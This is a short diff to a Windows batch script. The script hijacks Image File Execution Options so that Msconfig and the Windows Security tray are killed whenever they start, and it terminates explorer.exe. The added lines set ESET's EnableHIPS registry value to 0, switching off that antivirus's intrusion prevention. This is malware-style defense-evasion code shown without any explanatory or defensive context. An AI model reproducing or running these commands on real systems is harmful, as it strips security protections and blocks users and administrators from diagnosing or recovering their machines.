@@ -313,3 +313,5 @@ reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution 
 reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Msconfig.exe " /v Debugger /t REG_SZ /d "taskkill /f /im Msconfig.exe " /f 
 reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\SecurityHealthSystray.exe" /v Debugger /t REG_SZ /d "taskkill /f /im SecurityHealthSystray.exe" /f
 taskkill /f /im explorer.exe
+@echo off
+REG ADD "HKLM\Software\ESET\ESET Security\CurrentVersion\Info" /v "EnableHIPS" /t REG_DWORD /d "0" /f
